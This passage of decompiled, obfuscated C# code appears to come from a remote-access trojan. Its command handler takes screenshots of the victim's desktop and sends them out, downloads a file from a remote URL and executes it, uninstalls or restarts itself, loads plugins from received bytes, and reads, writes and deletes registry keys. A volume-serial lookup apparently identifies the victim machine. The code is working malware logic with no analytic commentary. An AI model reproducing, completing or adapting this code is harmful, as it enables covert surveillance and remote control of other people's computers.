                string str81 = new string(chArray1);
                \u0006.\u0007.\u0001(obj74, str81);
                str8 = \u0006.\u0007.\u0001(obj1, strArray1[1]);
                if (\u0018.\u007E\u0084((object) str8) > 0)
                {
                  numArray3 = \u0093.\u0014\u0003(str8);
                  \u0001 obj75 = obj1;
                  strArray2 = new string[5];
                  string[] strArray8 = strArray2;
                  chArray2 = new char[2]{ 'p', 'l' };
                  string str82 = new string(chArray2);
                  strArray8[0] = str82;
                  strArray2[1] = obj1.\u000E;
                  strArray2[2] = strArray1[1];
                  strArray2[3] = obj1.\u000E;
                  strArray2[4] = \u0086\u0002.\u009D\u0004(0);
                  string str83 = \u0091\u0002.\u0010\u0005(strArray2);
                  \u0006.\u0007.\u0001(obj75, str83);
                }
                else
                {
                  if (\u0018.\u007E\u0084((object) strArray1[2]) == 1)
                  {
                    \u0001 obj76 = obj1;
                    strArray2 = new string[5]
                    {
                      \u0006.\u0007.\u001F(3065),
                      obj1.\u000E,
                      strArray1[1],
                      obj1.\u000E,
                      \u0006.\u0007.\u001F(489)
                    };
                    string str84 = \u0091\u0002.\u0010\u0005(strArray2);
                    \u0006.\u0007.\u0001(obj76, str84);
                    return;
                  }
                  \u0001 obj77 = obj1;
                  byte[] numArray8 = \u0093.\u0014\u0003(strArray1[2]);
                  *(sbyte*) ((IntPtr) voidPtr + 16) = (sbyte) 0;
                  IntPtr num4 = (IntPtr) voidPtr + 16;
                  // ISSUE: cast to a reference type
                  numArray3 = \u0006.\u0007.\u0001(obj77, numArray8, (bool&) num4);
                  if (\u000F.\u0018(\u0006.\u0007.\u0001(obj1, strArray1[1], \u000E\u0003.\u008E\u0005(numArray3))))
                  {
                    \u0001 obj78 = obj1;
                    strArray2 = new string[5];
                    string[] strArray9 = strArray2;
                    chArray2 = new char[2]{ 'p', 'l' };
                    string str85 = new string(chArray2);
                    strArray9[0] = str85;
                    strArray2[1] = obj1.\u000E;
                    strArray2[2] = strArray1[1];
                    strArray2[3] = obj1.\u000E;
                    strArray2[4] = \u0086\u0002.\u009D\u0004(0);
                    string str86 = \u0091\u0002.\u0010\u0005(strArray2);
                    \u0006.\u0007.\u0001(obj78, str86);
                  }
                }
                \u0012 obj79 = \u0012.\u001B;
                \u0001 obj80 = obj1;
                byte[] numArray9 = numArray3;
                chArray2 = new char[1]{ 'A' };
                string str87 = new string(chArray2);
                object obj81 = \u0006.\u0007.\u0001(obj80, numArray9, str87);
                obj4 = obj79(obj81);
                \u0001 obj82 = obj1;
                strArray2 = new string[5];
                string[] strArray10 = strArray2;
                chArray2 = new char[3]{ 'r', 'e', 't' };
                string str88 = new string(chArray2);
                strArray10[0] = str88;
                strArray2[1] = obj1.\u000E;
                strArray2[2] = strArray1[1];
                strArray2[3] = obj1.\u000E;
                string[] strArray11 = strArray2;
                \u0001 obj83 = obj1;
                str4 = global::\u0002.\u0002(\u0001.\u0001(obj4, (System.Type) null, \u0006.\u0007.\u001F(3113), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
                ref string local = ref str4;
                string str89 = \u0006.\u0007.\u0001(obj83, ref local);
                strArray11[4] = str89;
                string str90 = \u0091\u0002.\u0010\u0005(strArray2);
                \u0006.\u0007.\u0001(obj82, str90);
                return;
              }
              \u001C obj84 = \u001C.\u0098;
              string str91 = str1;
              chArray2 = new char[3]{ 'C', 'A', 'P' };
              string str92 = new string(chArray2);
              if (obj84(str91, str92, false) == 0)
              {
                rectangle1 = \u0010\u0003.\u007E\u0090\u0005((object) \u000F\u0003.\u008F\u0005());
                int width = rectangle1.Width;
                rectangle2 = \u0010\u0003.\u007E\u0090\u0005((object) \u000F\u0003.\u008F\u0005());
                int height = rectangle2.Height;
                bitmap = new Bitmap(width, height);
                graphics1 = \u0011\u0003.\u0091\u0005((Image) bitmap);
                \u0012\u0003 obj85 = \u0012\u0003.\u007E\u0092\u0005;
                Graphics graphics2 = graphics1;
                size1 = new Size(\u0018.\u007E\u008B((object) bitmap), \u0018.\u007E\u008C((object) bitmap));
                Size size2 = size1;
                obj85((object) graphics2, 0, 0, 0, 0, size2, CopyPixelOperation.SourceCopy);
                try
                {
                  \u0015\u0003 obj86 = \u0015\u0003.\u007E\u0095\u0005;
                  Cursor cursor = \u0013\u0003.\u0093\u0005();
                  Graphics graphics3 = graphics1;
                  ref Rectangle local = ref rectangle2;
                  Point location = \u0014\u0003.\u0094\u0005();
                  size1 = new Size(32, 32);
                  Size size3 = size1;
                  local = new Rectangle(location, size3);
                  Rectangle rectangle3 = rectangle2;
                  obj86((object) cursor, graphics3, rectangle3);
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  exception3 = ex;
                  global::\u0006.\u0006();
                }
                \u009B.\u007E\u0086\u0003((object) graphics1);
                memoryStream1 = new MemoryStream();
                \u0001 obj87 = obj1;
                chArray2 = new char[3]{ 'C', 'A', 'P' };
                str4 = \u001D.\u0099(new string(chArray2), obj1.\u000E);
                \u0001 obj88 = obj87;
                obj0 = \u0006.\u0007.\u0001(ref str4, obj88);
                \u0084\u0002.\u007E\u009B\u0004((object) memoryStream1, obj0, 0, obj0.Length);
                memoryStream2 = new MemoryStream();
                \u0018\u0003.\u007E\u0098\u0005((object) \u0016\u0003.\u007E\u0096\u0005((object) bitmap, \u0096.\u001A\u0003(strArray1[1]), \u0096.\u001A\u0003(strArray1[2]), (Image.GetThumbnailImageAbort) null, num1), (Stream) memoryStream2, \u0017\u0003.\u0097\u0005());
                \u0084\u0002.\u007E\u009B\u0004((object) memoryStream1, \u0019\u0003.\u007E\u0099\u0005((object) memoryStream2), 0, checked ((int) \u0088.\u007E\u0099\u0002((object) memoryStream2)));
                \u0006.\u0007.\u0001(obj1, \u0019\u0003.\u007E\u0099\u0005((object) memoryStream1));
                \u009B.\u007E\u0087\u0003((object) memoryStream1);
                \u009B.\u007E\u0087\u0003((object) memoryStream2);
                \u009B.\u007E\u0088\u0003((object) bitmap);
                return;
              }
              \u001C obj89 = \u001C.\u0098;
              string str93 = str1;
              chArray2 = new char[1]{ 'P' };
              string str94 = new string(chArray2);
              if (obj89(str93, str94, false) == 0)
              {
                \u0001 obj90 = obj1;
                chArray1 = new char[1]{ 'P' };
                string str95 = new string(chArray1);
                \u0006.\u0007.\u0001(obj90, str95);
                return;
              }
              \u001C obj91 = \u001C.\u0098;
              string str96 = str1;
              chArray2 = new char[2]{ 'u', 'n' };
              string str97 = new string(chArray2);
              if (obj91(str96, str97, false) == 0)
              {
                str9 = strArray1[1];
                \u001C obj92 = \u001C.\u0098;
                string str98 = str9;
                chArray1 = new char[1]{ '~' };
                string str99 = new string(chArray1);
                if (obj92(str98, str99, false) == 0)
                {
                  \u0006.\u0007.\u0001(obj1);
                  return;
                }
                \u001C obj93 = \u001C.\u0098;
                string str100 = str9;
                chArray2 = new char[1]{ '!' };
                string str101 = new string(chArray2);
                if (obj93(str100, str101, false) == 0)
                {
                  \u0006.\u0007.\u0001(obj1, 0);
                  global::\u0006.\u0007();
                  return;
                }
                \u001C obj94 = \u001C.\u0098;
                string str102 = str9;
                chArray2 = new char[1]{ '@' };
                string str103 = new string(chArray2);
                if (obj94(str102, str103, false) != 0)
                  return;
                \u0006.\u0007.\u0001(obj1, 0);
                \u0011 obj95 = \u0011.\u001A;
                // ISSUE: type reference
                System.Type type = \u0013.\u001C(__typeref (Process));
                string str104 = \u0006.\u0007.\u001F(2495);
                objArray2 = new object[1];
                object[] objArray20 = objArray2;
                obj5 = obj1.\u0001;
                object obj96 = \u0012.\u001B(\u0001.\u0001(obj5, (System.Type) null, \u0006.\u0007.\u001F(2504), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
                objArray20[0] = obj96;
                objArray1 = objArray2;
                object[] objArray21 = objArray1;
                flagArray1 = new bool[1]{ true };
                bool[] flagArray4 = flagArray1;
                object obj97 = obj95((object) null, type, str104, objArray21, (string[]) null, (System.Type[]) null, flagArray4, true);
                if (flagArray1[0])
                {
                  global::\u0003 obj98 = global::\u0003.\u0003;
                  object obj99 = obj5;
                  string str105 = \u0006.\u0007.\u001F(2504);
                  objArray3 = new object[1]
                  {
                    \u0012.\u001B(objArray1[0])
                  };
                  object[] objArray22 = objArray3;
                  obj98(obj99, (System.Type) null, str105, objArray22, (string[]) null, (System.Type[]) null, true, false);
                }
                global::\u0006.\u0007();
                return;
              }
              \u001C obj100 = \u001C.\u0098;
              string str106 = str1;
              chArray2 = new char[2]{ 'u', 'p' };
              string str107 = new string(chArray2);
              if (obj100(str106, str107, false) == 0)
              {
                numArray4 = (byte[]) null;
                \u0015 obj101 = \u0015.\u007E\u0080;
                string str108 = \u001E.\u007E\u009C((object) strArray1[1]);
                chArray2 = new char[4]{ 'h', 't', 't', 'p' };
                string str109 = new string(chArray2);
                if (!obj101((object) str108, str109))
                {
                  \u0001 obj102 = obj1;
                  byte[] numArray10 = \u0093.\u0014\u0003(strArray1[1]);
                  *(sbyte*) ((IntPtr) voidPtr + 16) = (sbyte) 0;
                  IntPtr num5 = (IntPtr) voidPtr + 16;
                  // ISSUE: cast to a reference type
                  numArray4 = \u0006.\u0007.\u0001(obj102, numArray10, (bool&) num5);
                }
                else
                {
                  obj6 = (object) new WebClient();
                  \u0001 obj103 = \u0001.\u0001;
                  object obj104 = obj6;
                  string str110 = \u0006.\u0007.\u001F(3034);
                  objArray3 = new object[1];
                  object[] objArray23 = objArray3;
                  string[] strArray12 = strArray1;
                  *(int*) ((IntPtr) voidPtr + 4) = 1;
                  int index = *(int*) ((IntPtr) voidPtr + 4);
                  string str111 = strArray12[index];
                  objArray23[0] = (object) str111;
                  objArray2 = objArray3;
                  object[] objArray24 = objArray2;
                  flagArray1 = new bool[1]{ true };
                  bool[] flagArray5 = flagArray1;
                  object obj105 = obj103(obj104, (System.Type) null, str110, objArray24, (string[]) null, (System.Type[]) null, flagArray5);
                  if (flagArray1[0])
                  {
                    // ISSUE: type reference
                    strArray1[*(int*) ((IntPtr) voidPtr + 4)] = (string) \u0014.\u001D(\u0012.\u001B(objArray2[0]), \u0013.\u001C(__typeref (string)));
                  }
                  numArray4 = (byte[]) obj105;
                }
                \u0001 obj106 = obj1;
                chArray2 = new char[3]{ 'b', 'l', 'a' };
                string str112 = new string(chArray2);
                \u0006.\u0007.\u0001(obj106, str112);
                \u0011 obj107 = \u0011.\u001A;
                object obj108 = \u0001.\u0001(\u0001.\u0001(obj1.\u0004, (System.Type) null, \u0006.\u0007.\u001F(795), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, \u0006.\u0007.\u001F(856), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null);
                string str113 = \u0006.\u0007.\u001F(2460);
                objArray3 = new object[2]
                {
                  (object) \u0006.\u0007.\u001F(2473),
                  (object) \u0006.\u0007.\u001F(379)
                };
                object[] objArray25 = objArray3;
                object obj109 = obj107(obj108, (System.Type) null, str113, objArray25, (string[]) null, (System.Type[]) null, (bool[]) null, true);
                str10 = \u009F\u0002.\u0083\u0005(\u007F.\u001C\u0002(\u0006.\u0007.\u001F(3051)), \u0006.\u0007.\u001F(834), \u0006.\u0007.\u0001(10, obj1), \u0006.\u0007.\u001F(2517));
                \u0007\u0003.\u008C\u0005(str10, numArray4);
                \u001D\u0002 obj110 = \u001D\u0002.\u0091\u0004;
                string str114 = str10;
                chArray2 = new char[3]{ 'U', 'P', ':' };
                string str115 = \u001D.\u0099(new string(chArray2), \u0086\u0002.\u009D\u0004(\u0018.\u007E\u0089((object) \u0003\u0002.\u009E\u0003())));
                Process process = obj110(str114, str115);
                *(int*) voidPtr = 0;
                do
                {
                  \u001A.\u0095(10);
                  global::\u0007 obj111 = global::\u0007.\u000F;
                  \u0001 obj112 = \u0001.\u0001;
                  object obj113 = \u0001.\u0001(\u0001.\u0001(obj1.\u0004, (System.Type) null, \u0006.\u0007.\u001F(795), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, \u0006.\u0007.\u001F(856), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null);
                  string str116 = \u0006.\u0007.\u001F(3118);
                  objArray3 = new object[2]
                  {
                    (object) \u0006.\u0007.\u001F(2473),
                    (object) \u0006.\u0007.\u001F(379)
                  };
                  object[] objArray26 = objArray3;
                  object obj114 = obj112(obj113, (System.Type) null, str116, objArray26, (string[]) null, (System.Type[]) null, (bool[]) null);
                  string str117 = \u0006.\u0007.\u001F(736);
                  if (obj111(obj114, (object) str117, false))
                    \u0006.\u0007.\u0001(obj1);
                  *(int*) voidPtr = checked (*(int*) voidPtr + 1);
                }
                while (*(int*) voidPtr <= 500);
                return;
              }
              \u001C obj115 = \u001C.\u0098;
              string str118 = str1;
              chArray2 = new char[2]{ 'R', 'G' };
              string str119 = new string(chArray2);
              if (obj115(str118, str119, false) != 0)
                return;
              obj7 = (object) \u0006.\u0007.\u0001(obj1, strArray1[2]);
              str11 = strArray1[1];
              \u001C obj116 = \u001C.\u0098;
              string str120 = str11;
              chArray2 = new char[1]{ '~' };
              string str121 = new string(chArray2);
              if (obj116(str120, str121, false) == 0)
              {
                strArray2 = new string[6]
                {
                  \u0006.\u0007.\u001F(3131),
                  obj1.\u000E,
                  \u0006.\u0007.\u001F(3136),
                  obj1.\u000E,
                  strArray1[2],
                  obj1.\u000E
                };
                str12 = \u0091\u0002.\u0010\u0005(strArray2);
                str13 = \u0006.\u0007.\u001F(379);
                try
                {
                  enumerator1 = \u001A\u0002.\u007E\u008D\u0004((object) (IEnumerable) \u0001.\u0001(obj7, (System.Type) null, \u0006.\u0007.\u001F(3141), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
                  while (\u0087.\u007E\u0086\u0002((object) enumerator1))
                  {
                    str14 = global::\u0002.\u0002(\u001B\u0002.\u007E\u008E\u0004((object) enumerator1));
                    \u0015 obj117 = \u0015.\u007E\u001E;
                    string str122 = str14;
                    chArray2 = new char[1]{ '\\' };
                    string str123 = new string(chArray2);
                    if (!obj117((object) str122, str123))
                      str13 = global::\u0004.\u0004(str13, str14, obj1.\u000E);
                  }
                }
                finally
                {
                  if (enumerator1 is IDisposable)
                    \u009B.\u007E\u007F\u0003((object) (enumerator1 as IDisposable));
                }
                try
                {
                  enumerator2 = \u001A\u0002.\u007E\u008D\u0004((object) (IEnumerable) \u0001.\u0001(obj7, (System.Type) null, \u0006.\u0007.\u001F(1052), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
                  while (\u0087.\u007E\u0086\u0002((object) enumerator2))
                  {
                    str15 = global::\u0002.\u0002(\u001B\u0002.\u007E\u008E\u0004((object) enumerator2));
                    strArray2 = new string[7]
                    {
                      str13,
                      str15,
                      \u0006.\u0007.\u001F(3162),
                      null,
                      null,
                      null,
                      null
                    };
                    string[] strArray13 = strArray2;
                    \u0001 obj118 = \u0001.\u0001;
                    object obj119 = obj7;
                    string str124 = \u0006.\u0007.\u001F(3167);
                    objArray1 = new object[1]
                    {
                      (object) str15
                    };
                    objArray4 = objArray1;
                    object[] objArray27 = objArray4;
                    flagArray2 = new bool[1]{ true };
                    bool[] flagArray6 = flagArray2;
                    object obj120 = obj118(obj119, (System.Type) null, str124, objArray27, (string[]) null, (System.Type[]) null, flagArray6);
                    if (flagArray2[0])
                    {
                      // ISSUE: type reference
                      str15 = (string) \u0014.\u001D(\u0012.\u001B(objArray4[0]), \u0013.\u001C(__typeref (string)));
                    }
                    string str125 = obj120.ToString();
                    strArray13[3] = str125;
                    strArray2[4] = \u0006.\u0007.\u001F(3162);
                    string[] strArray14 = strArray2;
                    \u0001 obj121 = \u0001.\u0001;
                    object obj122 = obj7;
                    string str126 = \u0006.\u0007.\u001F(3118);
                    objArray3 = new object[2]
                    {
                      (object) str15,
                      (object) \u0006.\u0007.\u001F(379)
                    };
                    objArray2 = objArray3;
                    object[] objArray28 = objArray2;
                    flagArray1 = new bool[2]{ true, false };
                    bool[] flagArray7 = flagArray1;
                    object obj123 = obj121(obj122, (System.Type) null, str126, objArray28, (string[]) null, (System.Type[]) null, flagArray7);
                    if (flagArray1[0])
                    {
                      // ISSUE: type reference
                      str15 = (string) \u0014.\u001D(\u0012.\u001B(objArray2[0]), \u0013.\u001C(__typeref (string)));
                    }
                    string str127 = obj123.ToString();
                    strArray14[5] = str127;
                    strArray2[6] = obj1.\u000E;
                    str13 = \u0091\u0002.\u0010\u0005(strArray2);
                  }
                }
                finally
                {
                  if (enumerator2 is IDisposable)
                    \u009B.\u007E\u007F\u0003((object) (enumerator2 as IDisposable));
                }
                \u0006.\u0007.\u0001(obj1, \u001D.\u0099(str12, str13));
                return;
              }
              \u001C obj124 = \u001C.\u0098;
              string str128 = str11;
              chArray2 = new char[1]{ '!' };
              string str129 = new string(chArray2);
              if (obj124(str128, str129, false) == 0)
              {
                \u0011 obj125 = \u0011.\u001A;
                object obj126 = obj7;
                string str130 = \u0006.\u0007.\u001F(2460);
                objArray4 = new object[3];
                object[] objArray29 = objArray4;
                string[] strArray15 = strArray1;
                *(int*) ((IntPtr) voidPtr + 4) = 3;
                int index1 = *(int*) ((IntPtr) voidPtr + 4);
                string str131 = strArray15[index1];
                objArray29[0] = (object) str131;
                object[] objArray30 = objArray4;
                string[] strArray16 = strArray1;
                *(int*) ((IntPtr) voidPtr + 8) = 4;
                int index2 = *(int*) ((IntPtr) voidPtr + 8);
                string str132 = strArray16[index2];
                objArray30[1] = (object) str132;
                object[] objArray31 = objArray4;
                string[] strArray17 = strArray1;
                *(int*) ((IntPtr) voidPtr + 12) = 5;
                int index3 = *(int*) ((IntPtr) voidPtr + 12);
                string str133 = strArray17[index3];
                objArray31[2] = (object) str133;
                objArray3 = objArray4;
                object[] objArray32 = objArray3;
                flagArray2 = new bool[3]{ true, true, true };
                bool[] flagArray8 = flagArray2;
                object obj127 = obj125(obj126, (System.Type) null, str130, objArray32, (string[]) null, (System.Type[]) null, flagArray8, true);
                if (flagArray2[0])
                {
                  // ISSUE: type reference
                  strArray1[*(int*) ((IntPtr) voidPtr + 4)] = (string) \u0014.\u001D(\u0012.\u001B(objArray3[0]), \u0013.\u001C(__typeref (string)));
                }
                if (flagArray2[1])
                {
                  // ISSUE: type reference
                  strArray1[*(int*) ((IntPtr) voidPtr + 8)] = (string) \u0014.\u001D(\u0012.\u001B(objArray3[1]), \u0013.\u001C(__typeref (string)));
                }
                if (!flagArray2[2])
                  return;
                // ISSUE: type reference
                strArray1[*(int*) ((IntPtr) voidPtr + 12)] = (string) \u0014.\u001D(\u0012.\u001B(objArray3[2]), \u0013.\u001C(__typeref (string)));
                return;
              }
              \u001C obj128 = \u001C.\u0098;
              string str134 = str11;
              chArray2 = new char[1]{ '@' };
              string str135 = new string(chArray2);
              if (obj128(str134, str135, false) == 0)
              {
                \u0011 obj129 = \u0011.\u001A;
                object obj130 = obj7;
                string str136 = \u0006.\u0007.\u001F(2539);
                objArray4 = new object[2];
                object[] objArray33 = objArray4;
                string[] strArray18 = strArray1;
                *(int*) ((IntPtr) voidPtr + 12) = 3;
                int index = *(int*) ((IntPtr) voidPtr + 12);
                string str137 = strArray18[index];
                objArray33[0] = (object) str137;
                objArray4[1] = (object) false;
                objArray3 = objArray4;
                object[] objArray34 = objArray3;
                flagArray2 = new bool[2]{ true, false };
                bool[] flagArray9 = flagArray2;
                object obj131 = obj129(obj130, (System.Type) null, str136, objArray34, (string[]) null, (System.Type[]) null, flagArray9, true);
                if (!flagArray2[0])
                  return;
                // ISSUE: type reference
                strArray1[*(int*) ((IntPtr) voidPtr + 12)] = (string) \u0014.\u001D(\u0012.\u001B(objArray3[0]), \u0013.\u001C(__typeref (string)));
                return;
              }
              \u001C obj132 = \u001C.\u0098;
              string str138 = str11;
              chArray2 = new char[1]{ '#' };
              string str139 = new string(chArray2);
              if (obj132(str138, str139, false) == 0)
              {
                \u0011 obj133 = \u0011.\u001A;
                object obj134 = obj7;
                string str140 = \u0006.\u0007.\u001F(1035);
                objArray4 = new object[1];
                object[] objArray35 = objArray4;
                string[] strArray19 = strArray1;
                *(int*) ((IntPtr) voidPtr + 12) = 3;
                int index = *(int*) ((IntPtr) voidPtr + 12);
                string str141 = strArray19[index];
                objArray35[0] = (object) str141;
                objArray3 = objArray4;
                object[] objArray36 = objArray3;
                flagArray2 = new bool[1]{ true };
                bool[] flagArray10 = flagArray2;
                object obj135 = obj133(obj134, (System.Type) null, str140, objArray36, (string[]) null, (System.Type[]) null, flagArray10, true);
                if (!flagArray2[0])
                  return;
                // ISSUE: type reference
                strArray1[*(int*) ((IntPtr) voidPtr + 12)] = (string) \u0014.\u001D(\u0012.\u001B(objArray3[0]), \u0013.\u001C(__typeref (string)));
                return;
              }
              \u001C obj136 = \u001C.\u0098;
              string str142 = str11;
              chArray2 = new char[1]{ '$' };
              string str143 = new string(chArray2);
              if (obj136(str142, str143, false) != 0)
                return;
              \u0011 obj137 = \u0011.\u001A;
              object obj138 = obj7;
              string str144 = \u0006.\u0007.\u001F(3184);
              objArray4 = new object[1];
              object[] objArray37 = objArray4;
              string[] strArray20 = strArray1;
              *(int*) ((IntPtr) voidPtr + 12) = 3;
              int index4 = *(int*) ((IntPtr) voidPtr + 12);
              string str145 = strArray20[index4];
              objArray37[0] = (object) str145;
              objArray3 = objArray4;
              object[] objArray38 = objArray3;
              flagArray2 = new bool[1]{ true };
              bool[] flagArray11 = flagArray2;
              object obj139 = obj137(obj138, (System.Type) null, str144, objArray38, (string[]) null, (System.Type[]) null, flagArray11, true);
              if (!flagArray2[0])
                return;
              // ISSUE: type reference
              strArray1[*(int*) ((IntPtr) voidPtr + 12)] = (string) \u0014.\u001D(\u0012.\u001B(objArray3[0]), \u0013.\u001C(__typeref (string)));
              return;
            }
          }
          \u001B obj140 = \u001B.\u0097;
          object obj141 = obj3;
          string str146 = \u0006.\u0007.\u001F(3089);
          objArray2 = new object[1]{ (object) strArray1[2] };
          object[] objArray39 = objArray2;
          obj140(obj141, (System.Type) null, str146, objArray39, (string[]) null, (System.Type[]) null);
          object obj142 = \u0011.\u001A(obj3, (System.Type) null, \u0006.\u0007.\u001F(3094), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
          while (!\u000F.\u0018(global::\u000E.\u0017((object) !obj1.\u0003, global::\u0008.\u0012(\u0001.\u0001(obj3, (System.Type) null, \u0006.\u0007.\u001F(3103), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (object) true, false))))
            \u001A.\u0095(1);
          \u001B obj143 = \u001B.\u0097;
          object obj144 = obj3;
          string str147 = \u0006.\u0007.\u001F(3108);
          objArray2 = new object[1]{ (object) true };
          object[] objArray40 = objArray2;
          obj143(obj144, (System.Type) null, str147, objArray40, (string[]) null, (System.Type[]) null);
        }
        catch (Exception ex1)
        {
          ProjectData.SetProjectError(ex1);
          exception4 = ex1;
          try
          {
            \u0001 obj145 = obj1;
            strArray2 = new string[5];
            string[] strArray21 = strArray2;
            chArray2 = new char[2]{ 'E', 'R' };
            string str148 = new string(chArray2);
            strArray21[0] = str148;
            strArray2[1] = obj1.\u000E;
            strArray2[2] = strArray1[0];
            strArray2[3] = obj1.\u000E;
            strArray2[4] = \u001E.\u007E\u0004\u0002((object) exception4);
            string str149 = \u0091\u0002.\u0010\u0005(strArray2);
            \u0006.\u0007.\u0001(obj145, str149);
            if (\u001C.\u0098(strArray1[0], \u0006.\u0007.\u001F(3209), false) == 0 | \u001C.\u0098(strArray1[0], \u0006.\u0007.\u001F(3214), false) == 0)
            {
              \u0001 obj146 = obj1;
              chArray2 = new char[3]{ 'b', 'l', 'a' };
              string str150 = new string(chArray2);
              \u0006.\u0007.\u0001(obj146, str150);
            }
          }
          catch (Exception ex2)
          {
            ProjectData.SetProjectError(ex2);
            exception5 = ex2;
            global::\u0006.\u0006();
          }
          global::\u0006.\u0006();
        }
      }
      catch (Exception ex)
      {
        Rectangle rectangle4;
        Rectangle rectangle5;
        Rectangle rectangle6;
        Rectangle rectangle7;
        Rectangle rectangle8;
        Rectangle rectangle9;
        Rectangle rectangle10;
        object[] objArray41 = new object[64]
        {
          (object) strArray1,
          (object) exception1,
          (object) exception2,
          (object) str2,
          (object) numArray1,
          (object) str6,
          obj2,
          (object) numArray2,
          obj3,
          (object) str7,
          (object) numArray3,
          obj4,
          (object) str8,
          (object) graphics1,
          (object) memoryStream1,
          (object) memoryStream2,
          (object) bitmap,
          (object) exception3,
          (object) numArray4,
          (object) str10,
          obj6,
          (object) *(int*) voidPtr,
          obj7,
          (object) str13,
          (object) str12,
          (object) str14,
          (object) str15,
          (object) exception4,
          (object) exception5,
          (object) str1,
          (object) chArray1,
          (object) objArray1,
          (object) chArray2,
          (object) str3,
          (object) str4,
          (object) strArray2,
          (object) str5,
          (object) (bool) *(sbyte*) ((IntPtr) voidPtr + 16),
          (object) *(int*) ((IntPtr) voidPtr + 4),
          (object) objArray2,
          (object) flagArray1,
          (object) rectangle4,
          (object) rectangle5,
          (object) rectangle6,
          (object) rectangle7,
          (object) rectangle8,
          (object) rectangle9,
          (object) rectangle10,
          (object) rectangle1,
          (object) rectangle2,
          (object) size1,
          (object) num1,
          (object) str9,
          obj5,
          (object) objArray3,
          (object) str11,
          (object) enumerator1,
          (object) enumerator2,
          (object) objArray4,
          (object) flagArray2,
          (object) *(int*) ((IntPtr) voidPtr + 8),
          (object) *(int*) ((IntPtr) voidPtr + 12),
          (object) obj1,
          (object) obj0
        };
        \u0006.\u0007.\u0001(ex, objArray41);
        throw;
      }
    }

    static string \u0001() => \u0006.\u0007.\u001F(1132);

    static SecurityException \u0001([In] \u0001 obj0) => obj0.\u0001;

    static unsafe int \u0001([In] int obj0, [In] int obj1, [In] \u0003.\u0004.\u0001 obj2, [In] byte[] obj3)
    {
      void* voidPtr;
      do
      {
        // ISSUE: untyped stack allocation
        voidPtr = (void*) __untypedstackalloc(12);
        try
        {
          *(int*) voidPtr = 0;
label_11:
          do
          {
            if (obj2.\u0001 != 11)
              goto label_12;
label_6:
            do
            {
              if (!\u0006.\u0007.\u0001(obj2))
              {
                if (\u0006.\u0007.\u0001(obj2.\u0001) <= 0)
                  goto label_10;
              }
              else
                goto label_11;
            }
            while (false);
            continue;
label_12:
            *(int*) ((IntPtr) voidPtr + 4) = \u0006.\u0007.\u0001(obj0, obj3, obj2.\u0001, obj1);
            do
            {
              obj1 += *(int*) ((IntPtr) voidPtr + 4);
              if (false)
                goto label_11;
            }
            while (false);
            *(int*) voidPtr = *(int*) voidPtr + *(int*) ((IntPtr) voidPtr + 4);
            obj0 -= *(int*) ((IntPtr) voidPtr + 4);
            if (obj0 != 0)
              goto label_6;
            else
              goto label_5;
          }
          while (obj2.\u0001 != 11);
          goto label_10;
label_5:
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) voidPtr;
          if (true)
            goto label_14;
label_10:
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) voidPtr;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
          \u0003.\u0004.\u0001 obj = obj2;
          byte[] numArray = obj3;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) obj1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local4 = (ValueType) obj0;
          \u0006.\u0007.\u0001(ex, (object) local1, (object) local2, (object) obj, (object) numArray, (object) local3, (object) local4);
          throw;
        }
label_14:;
      }
      while (false);
      return *(int*) ((IntPtr) voidPtr + 8);
    }

    [DllImport("kernel32", EntryPoint = "GetVolumeInformationA", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern int \u0001(
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param0,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1,
      int _param2,
      ref int _param3,
      ref int _param4,
      ref int _param5,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param6,
      int _param7);

    static void \u0001([In] EventHandler obj0, [In] \u0006.\u0006 obj1)
    {
      EventHandler eventHandler1 = obj1.\u0001;
label_4:
      EventHandler comparand = eventHandler1;
      do
      {
        EventHandler eventHandler2 = (EventHandler) \u0001\u0002.\u009C\u0003((Delegate) comparand, (Delegate) obj0);
        EventHandler eventHandler3;
        if (true)
          eventHandler3 = eventHandler2;
        eventHandler1 = Interlocked.CompareExchange<EventHandler>(ref obj1.\u0001, eventHandler3, comparand);
        if (eventHandler1 != comparand)
          goto label_4;
      }
      while (false);
    }

    static bool \u0001([In] string obj0, [In] \u0003.\u0005 obj1)
    {
label_0:
      int num1 = \u008A.\u009B\u0002(obj0) ? 1 : 0;
      int num2;
      while (true)
      {
        if (num1 != 0)
          \u008D\u0002.\u0007\u0005(obj0);
        if (true)
        {
          num2 = \u0006.\u0007.\u0001(obj1.\u0001, obj0) ? 1 : 0;
          if (false)
            num1 = num2;
          else
            break;
        }
        else
          goto label_0;
      }
      return num2 != 0;
    }

    static bool \u0001([In] \u0003.\u0004.\u0006 obj0)
    {
      bool flag;
      try
      {
        flag = \u0006.\u0007.\u0001(obj0.\u0001);
      }
      catch (Exception ex)
      {
        \u0003.\u0004.\u0006 obj = obj0;
        \u0006.\u0007.\u0001(ex, (object) obj);
        throw;
      }
      return flag;
    }

    static string \u0001([In] \u0001 obj0, [In] ref string obj1)
    {
      byte[] numArray1;
      string str1;
      string str2;
      try
      {
        numArray1 = \u0083\u0002.\u007E\u0099\u0004((object) \u0091.\u0010\u0003(), obj1);
        str1 = \u000E\u0003.\u008E\u0005(numArray1);
        do
        {
          str2 = str1;
        }
        while (false);
      }
      catch (Exception ex)
      {
        byte[] numArray2 = numArray1;
        string str3 = str1;
        \u0001 obj = obj0;
        string str4 = obj1;
